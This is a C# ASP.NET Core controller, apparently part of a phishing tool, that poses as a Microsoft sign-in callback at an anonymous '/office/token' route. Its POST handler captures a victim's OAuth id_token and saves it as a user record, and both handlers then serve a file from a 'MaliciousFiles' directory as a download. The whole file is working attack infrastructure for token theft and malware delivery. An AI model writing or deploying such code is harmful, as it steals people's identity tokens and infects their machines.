using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Configuration;
using System;
using System.IO;
using Maraki1982.Web.Utilities.Interfaces;
using Maraki1982.Core.Models.Enum;
using Microsoft.Extensions.Logging;
using Microsoft.AspNetCore.Authorization;

namespace Maraki1982.Web.Controllers
{
    [AllowAnonymous]
    [Route("office")]
    public class MicrosoftController : Controller
    {
        private readonly IConfiguration _configuration;
        private readonly IUserUtility _userUtility;
        private readonly ILogger<MicrosoftController> _logger;

        public MicrosoftController(IConfiguration configuration, IUserUtility userUtility, ILogger<MicrosoftController> logger)
        {
            _configuration = configuration;
            _userUtility = userUtility;
            _logger = logger;
        }

        [HttpGet]
        [Route("token")]
        public IActionResult Index()
        {
            try
            {
                return DownloadMaliciousFile();
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, ex.Message);
                return Redirect(_configuration["Authentication:Microsoft:ExceptionRedirectUrl"]);
            }
        }

        [HttpPost]
        [Route("token")]
        [Consumes("application/x-www-form-urlencoded")]
        public IActionResult Index([FromForm] IFormCollection value)
        {
            try
            {
                string idToken = value.ContainsKey("id_token") ? value["id_token"].ToString() : string.Empty;
                _userUtility.CreateUpdateUser(idToken, VendorEnum.Microsoft);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, ex.Message);
            }

            return DownloadMaliciousFile();
        }

        private IActionResult DownloadMaliciousFile()
        {
            string path = Path.Combine(Environment.CurrentDirectory, "MaliciousFiles", _configuration["Authentication:Microsoft:FileToDownload"]);
            FileStream fileStream = System.IO.File.OpenRead(path);

            return (File(fileStream, "application/octet-stream", Path.GetFileName(path)));
        }
    }
}
